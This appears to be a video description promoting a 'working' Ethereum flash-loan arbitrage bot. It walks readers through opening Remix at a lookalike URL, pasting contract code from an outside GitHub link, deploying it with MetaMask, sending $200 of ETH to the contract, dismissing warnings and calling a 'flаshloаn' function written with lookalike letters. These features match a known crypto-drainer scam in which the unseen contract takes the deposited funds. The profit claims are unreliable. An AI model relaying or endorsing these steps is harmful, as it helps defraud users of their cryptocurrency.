title: Earn Crypto With ETH Using AAVE Flаsh Loаns Arbitrage Ethereum Uniswap.
description: *** Working! (Updated on January 11, 2023)  STEPS:  Before starting, install and setup MetaMask in Chrome Browser.  1. Open and setup Remix in browser - https://remixethereum-ide.github.io/  2. Copy the Contract code - https://raw.githubusercontent.com/MF-Finance/contracts/main/EthERC20ArbitrageContract.sol  3. Create new file in Remix and paste Contract code and wait for everything to load, Go to Solidity Compiler and Select compiler to 0.5.0+commit version and hit Compile.  4. In Deploy & Run Transactions, Select Injected Web3 in Environment dropdown menu to connect your MetaMask. On Deploy, Enter your token details and deploy the contract * If "Estimated gas fee" shows "Unknown processing time" message, you need to increase the fee: Click "EDIT" :right arrow: click "Edit suggested gas fee" :right arrow: click "High" and click "Save".  5. Get the Contract address from Remix  6. Send $200 of ETH to the contract for gas fee for all swaps (There are going to be many swaps to use all funds from out liquidity pools. * If a warning is displayed, click "I understand".  7. Call 'flаshloаn' function in Remix.  Thanks for watching!
